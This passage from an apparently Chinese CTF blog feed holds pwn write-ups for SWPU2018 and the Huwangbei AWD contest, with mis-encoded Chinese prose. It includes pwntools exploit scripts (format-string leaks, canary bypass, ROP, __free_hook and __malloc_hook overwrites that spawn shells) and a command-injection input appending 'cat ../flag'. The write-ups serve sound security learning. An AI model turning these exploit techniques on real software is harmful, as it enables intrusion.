ï¼Œç¬¬ä¸€ååº”æ˜¯åˆ©ç”¨C++å¼‚å¸¸å¤„ç†çš„æœºåˆ¶ç»•è¿‡canaryï¼Œç„¶è€Œç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²é™åˆ¶å¤ªå°‘ï¼Œå¯¼è‡´è¿™é¢˜å‡ºç°å„ç§éé¢„æœŸè§£ã€‚</p><h4 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h4><p>é¦–å…ˆç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²heapåœ°å€å’Œlibcåœ°å€ï¼Œç„¶åè¾“å…¥<code>-9223372036854775808</code>ç»•è¿‡é•¿åº¦é™åˆ¶è¿›è¡Œæ ˆæº¢å‡ºï¼Œä¹‹ååˆ©ç”¨C++å¼‚å¸¸å¤„ç†çš„æœºåˆ¶ç»•è¿‡canaryï¼Œå¹¶ä¸”å°†æ ˆè¿ç§»åˆ°å †ä¸­è¿›è¡ŒROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%7$p|%12$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">heap_addr = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line">pivot_addr = heap_addr + <span class="number">0x20</span></span><br><span class="line">unwind_addr = <span class="number">0x400EC5</span> </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'aaaaaaaa'</span>,one_gadget).ljust(<span class="number">0x410</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat(pivot_addr,unwind_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="éé¢„æœŸ1"><a href="#éé¢„æœŸ1" class="headerlink" title="éé¢„æœŸ1"></a>éé¢„æœŸ1</h4><p>è¿™ä¸ªæ–¹æ³•æœ€ç®€å•ï¼Œæ—¢ç„¶æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç›´æ¥æ³„éœ²canaryå¥½äº†ï¼Œè¿˜ç»•è¿‡å•¥ï¼Œæº¢å‡ºç›´æ¥ç»„ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%15$p|%12$p'</span>) <span class="comment"># Hello 0x7f4de5bb4620please </span></span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x408</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) +p64(<span class="number">0x400fa3</span>)+ p64(libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="éé¢„æœŸ2"><a href="#éé¢„æœŸ2" class="headerlink" title="éé¢„æœŸ2"></a>éé¢„æœŸ2</h4><p>è¿™ä¸ªæ–¹æ³•åªéœ€ç”¨åˆ°æ ¼å¼å­—ç¬¦ä¸²ï¼Œè¿æ ˆæº¢å‡ºéƒ½ä¸éœ€è¦ï¼Œä¸‡ä¸€ä¸çŸ¥-9223372036854775808è¿™ä¸ªæŠ€å·§ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯å¾ˆå¥½ç”¨çš„ï¼Œå°±æ˜¯éº»çƒ¦ç‚¹ã€‚æ€è·¯å°±æ˜¯ä¿®æ”¹freeçš„gotè¡¨ä¸ºmainå‡½æ•°ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºï¼Œä¹‹åé‡æ–°æ”¹å›æ­£ç¡®çš„freeã€‚å¯ä»¥ä¿®æ”¹free_hookæ¥getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%147c%11$hhn%123c%12$hhn'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%12$p'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span> </span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">X0 = one_gadget&amp;<span class="number">0x000000ff</span></span><br><span class="line">X1 = (one_gadget&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">X2 = (one_gadget&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">X3 = (one_gadget&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span></span><br><span class="line">X4 = (one_gadget&amp;<span class="number">0xff00000000</span>)&gt;&gt;<span class="number">32</span></span><br><span class="line">X5 = (one_gadget&amp;<span class="number">0xff0000000000</span>)&gt;&gt;<span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X0,(X1-X0)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook) + p64(free_hook+<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X2,(X3-X2)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">2</span>) + p64(free_hook+<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X4,(X5-X4)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">4</span>) + p64(free_hook+<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%214c%11$hhn%51c%12$hhn!'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><h3 id="åŸºç¡€android"><a href="#åŸºç¡€android" class="headerlink" title="åŸºç¡€android"></a>åŸºç¡€android</h3><p>apké‡Œé¢æœ‰ä¸€ä¸ªzipæ–‡ä»¶ï¼Œå…¶å®æ˜¯ä¸ªjpgï¼Œä¿®æ”¹åç¼€æ‰“å¼€</p><h3 id="android-2-0"><a href="#android-2-0" class="headerlink" title="android 2.0"></a>android 2.0</h3><p>å…³é”®ç®—æ³•åœ¨soé‡Œé¢ï¼Œç¨‹åºå°†15ä½è¾“å…¥åˆ†æˆ3å—ï¼Œæ¯å—åœ¨è¿›è¡Œä¸€æ¬¡ç®€å•çš„è¿ç®—ï¼Œç›´æ¥é€†ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><ol><li>ä¿®æ”¹åˆ†è¾¨ç‡å¾—åˆ°ä¸€éƒ¨åˆ†flag</li><li>æ–‡ä»¶æœ«ä½æœ‰å¦ä¸€éƒ¨åˆ†flag</li></ol><h3 id="å”¯æœ‰ä½å¤´-æ‰èƒ½å‡ºå¤´"><a href="#å”¯æœ‰ä½å¤´-æ‰èƒ½å‡ºå¤´" class="headerlink" title="å”¯æœ‰ä½å¤´,æ‰èƒ½å‡ºå¤´"></a>å”¯æœ‰ä½å¤´,æ‰èƒ½å‡ºå¤´</h3><p>ä¸¾å¤´æœ›æ˜æœˆ,ä½å¤´â€¦  ï¼Œï¼ˆçœ‹é”®ç›˜ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 5 66 3 3 666 33 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">looktheendkeyboard</span><br></pre></td></tr></table></figure><h3 id="æµé‡ç­¾åˆ°"><a href="#æµé‡ç­¾åˆ°" class="headerlink" title="æµé‡ç­¾åˆ°"></a>æµé‡ç­¾åˆ°</h3><p>ç›´æ¥æœå…³é”®å­—</p><h2 id="å¹¿å‘Š"><a href="#å¹¿å‘Š" class="headerlink" title="å¹¿å‘Š"></a>å¹¿å‘Š</h2><p>å„ä½å¤§ä½¬å¸®æˆ‘è–…ç¾Šæ¯›å•Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰“å¼€æ”¯ä»˜å®é¦–é¡µæœâ€œ575219â€é¢†çº¢åŒ…ï¼Œé¢†åˆ°å¤§çº¢åŒ…çš„å°ä¼™ä¼´èµ¶ç´§ä½¿ç”¨å“¦ï¼</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyd1myrti1j20fs0noq4z.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;swpu2018&quot;&gt;&lt;a href=&quot;#swpu2018&quot; class=&quot;headerlink&quot; title=&quot;swpu2018&quot;&gt;&lt;/a&gt;swpu2018&lt;/h1&gt;&lt;p&gt;å¹´åº•å¿™æˆç‹—ï¼Œæ²¡ä»€ä¹ˆæ—¶é—´ï¼ŒèŠ±äº†ä¸¤ä¸ªæ™šä¸Šçš„æ—¶é—´ï¼Œåšäº†ä¸€ä¸‹ç®€å•çš„é¢˜ç›®ï¼Œè¿˜æœ‰äº›é¢˜ç›®åé¢ç»§ç»­è¡¥ã€‚&lt;/p
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>é¦–å±ŠæŠ¤ç½‘æ¯AWD PWNé¢˜writeup</title>
    <link href="https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/</id>
    <published>2018-11-06T12:53:16.000Z</published>
    <updated>2018-11-06T13:14:16.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šä¸ªæœˆåœ¨æŠ¤ç½‘æ¯æ‰“äº†ä¸ªé…±æ²¹ï¼Œç¬¬ä¸€æ¬¡æ‰“æŸå®çš„çº¿ä¸‹èµ›ï¼Œé£æ ¼è·ŸæŸæ˜¥ç§‹å·®åˆ«è¿˜æ˜¯æŒºå¤§çš„ï¼Œæ²¡ä»€ä¹ˆç«¯å£é™åˆ¶ï¼Œæflagæ¥å£ä¹Ÿå¾ˆå‹å¥½ï¼Œå±äºæœ€å¼€æ”¾çš„ç½‘ç»œç¯å¢ƒäº†ï¼Œå¯ä»¥ç”¨å„ç§å¤§æ€å™¨ï¼ˆç„¶è€Œæˆ‘æ²¡æœ‰å‡†å¤‡= =|||ï¼‰ã€‚æ¯”èµ›å½“æ—¶åªç”¨åˆ°äº†æœ€ç®€å•çš„æ´ï¼Œè™½ç„¶å®˜æ–¹ç»™äº†æµé‡ï¼ˆé˜Ÿå‹ä¸è¯´æˆ‘éƒ½æ²¡å‘ç°ã€‚ã€‚ã€‚ï¼‰ï¼Œä½†æ˜¯æ²¡å•¥ç»éªŒï¼Œæ¯”èµ›çš„æ—¶å€™ä¹Ÿæ²¡æˆåŠŸé‡æ”¾ã€‚æ€»ä½“æ¥è¯´é¢˜ç›®è´¨é‡ä¸é”™ï¼Œéš¾å¾—æœ‰æ”»å‡»æµé‡ï¼Œèµ›åæ¥å­¦ä¹ ä¸€æ³¢å§~</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>è¿™é¢˜æœ‰ä¸€ä¸ªè¶…çº§ç®€å•çš„å‘½ä»¤æ‰§è¡Œæ´ï¼Œç›´æ¥<code>ls</code>åé—­åˆå‘½ä»¤å°±å¯ä»¥äº†ï¼Œå¦‚<code>/ &amp;&amp; cat ../flag</code>ã€‚å¦å¤–è¿˜æœ‰ä¸€ä¸ªå †çš„æ´ï¼Œç½‘ä¸Šæœ‰å¤§ç¥åˆ†æè¿‡ï¼Œæˆ‘å°±ä¸å†™äº†ï¼Œç›´æ¥ç»™EXPï¼ŒåŸç†å·®ä¸å¤šï¼Œæ¼æ´åˆ©ç”¨æ–¹å¼ç•¥æœ‰ä¸åŒè€Œå·²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msend</span><span class="params">(size,smsg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Content:'</span>,smsg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mrecv</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'recv'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'recv:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mencode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'encode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'encode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mdecode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'decode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'decode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mencode(<span class="number">8</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mdecode(<span class="number">8</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> + <span class="number">0xff</span>) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">msend(<span class="number">0x100</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># 0x80</span></span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># 0x70 fastbins</span></span><br><span class="line">fake_fd = libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x78</span> + p64(<span class="number">0x71</span>) + p64(fake_fd) <span class="comment"># len = 0x88</span></span><br><span class="line">msend(<span class="number">0x100</span>,payload)</span><br><span class="line">mencode(<span class="number">0x88</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># overwrite fastbins#0x70-&gt;fd</span></span><br><span class="line">mdecode(<span class="number">0x88</span>)</span><br><span class="line">msend(<span class="number">0x68</span>,<span class="string">''</span>.ljust(<span class="number">0x13</span><span class="number">-8</span>,<span class="string">'a'</span>)+p64(libc.address+<span class="number">0x4526a</span>)+p64(libc.sym[<span class="string">'__libc_realloc'</span>]+<span class="number">8</span>))</span><br><span class="line">mencode(<span class="number">0x20</span>)</span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># overwrite  malloc_hook</span></span><br><span class="line">mdecode(<span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(<span class="number">0</span>)) <span class="comment"># trigger malloc</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>è¿™é¢˜çš„å¤æ‚ç¨‹åº¦ç®€ç›´ä¸§å¿ƒç—…ç‹‚ï¼Œåœ¨æ­¤è†œä¸€ä¸‹è…¾è®¯çš„å¤§ä½¬ï¼Œ4å°æ—¶çš„æ¯”èµ›èƒ½åšå‡ºè¿™é¢˜ç›®ã€‚ä»æµé‡æ¥çœ‹ï¼Œå¾ˆå¤šé˜Ÿä¼éƒ½æ˜¯é‡å‘è…¾è®¯çš„æµé‡ï¼Œè¿˜æœ‰ä¸€é˜Ÿæ˜¯å¦ä¸€ç§è§£æ³•ï¼Œå§¿åŠ¿ä¹Ÿæ˜¯å¾ˆå€¼å¾—å­¦ä¹ ã€‚è¿™æ¡é¢˜ä¸€å †çš„ç»“æ„ä½“ï¼Œå•æ˜¯çœ‹ç¨‹åºé€»è¾‘éƒ½çœ‹äº†åŠå¤©ã€‚å¤§ä½¬ä»¬éƒ½æ˜¯é£æ°´å¤§å¸ˆï¼Œå †é£æ°´6å¾—é£èµ·ã€‚</p><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>è¿™é¢˜ç›®çš„ä¸»è¦åŠŸèƒ½æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æ“ä½œ<code>cake</code>çš„æµç¨‹ï¼Œä¸€ä¸ªæ˜¯æ“ä½œ<code>account</code>çš„æµç¨‹ã€‚å…¶ä¸­éœ€è¦å…³é”®æ“ä½œï¼ˆå¯¹è´¦å·æ“ä½œï¼Œå¯¹è›‹ç³•ä¸‹å•ï¼‰éœ€è¦<code>admin</code>æƒé™ï¼Œç•™æ„ç¨‹åºåˆå§‹åŒ–ç”Ÿæˆäº†ä¸€ä¸ª<code>admin</code>è´¦å·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">init_admin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  is_admin[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  account_id[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  user_db[<span class="number">0</span>] = (struct user *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  money[<span class="number">0</span>] = <span class="number">880L</span>L;</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;name, <span class="string">"Admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;password, <span class="string">"admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;desc, <span class="string">"what ? this is cake ???"</span>, <span class="number">0x58</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>cakeæ“ä½œ</li></ol><p>å‡ ä¸ªé‡è¦çš„ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 code;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> random_num[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">int</span> cake_number;</span><br><span class="line">  <span class="keyword">char</span> cake_taste[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> cake_code[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_order</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 price;</span><br><span class="line">  <span class="keyword">char</span> *desc;  <span class="comment">// 0x7c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è´­ä¹°<code>cake</code>çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- add_to_list | malloc(0x18) æ–°å¢ä¸€ä¸ªlist</span><br><span class="line">- order_cake | malloc(0x18) -&gt; malloc(0x7c) -&gt; free(0x18) æ–°å¢orderåŠå…¶descï¼Œæ‰€æœ‰orderå®Œæˆåï¼Œä»åå¾€å‰æ¸…æ‰æ‰€æœ‰list</span><br><span class="line">- cancel_list | free(0x18) å–æ¶ˆä¸€ä¸ªlist</span><br><span class="line">- buy | free(0x7c) -&gt; free(0x18) -&gt; malloc(0x4b0) æ¸…é™¤listçš„descï¼Œæ¸…é™¤listï¼Œæ–°å¢ä¸€ä¸ªdesc</span><br></pre></td></tr></table></figure></p><p>å†…å­˜æ³„éœ²æ¼æ´ç‚¹åœ¨ï¼Œåˆ›å»ºæ–°<code>cake_list</code>çš„æ—¶å€™ï¼Œæ²¡æœ‰åˆå§‹åŒ–å†…å­˜ï¼Œç”Ÿæˆçš„éšæœºæ•°åªæœ‰ä¸€ä½ï¼Œé‡æ–°åˆ©æ—§<code>bins</code>çš„æ—¶å€™åªä¼šè¦†ç›–<code>fd</code>çš„æœ€ä½ä½ï¼Œæ‰“å°<code>cake_list</code>ä¿¡æ¯çš„æ—¶å€™å¯ä»¥æ³„éœ²åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new_cake_list = (struct cake_list *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v1 = random_();</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, v1);</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;random_num, &amp;s, <span class="number">1u</span>LL);</span><br><span class="line">new_cake_list-&gt;cake_number = cake[v3]-&gt;number;</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;cake_taste, cake[v3]-&gt;taste, <span class="number">8u</span>LL);</span><br><span class="line">*(_DWORD *)new_cake_list-&gt;cake_code = cake[v3]-&gt;code;</span><br><span class="line">cake_list[list_count++] = new_cake_list;</span><br><span class="line">show_cake_list();</span><br></pre></td></tr></table></figure><ol><li>accountæ“ä½œ</li></ol><p>ç»“æ„ä½“å¦‚ä¸‹ï¼š(å…¶ä¸­<code>user_list</code>å­˜åœ¨<code>bss</code>æ®µ)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 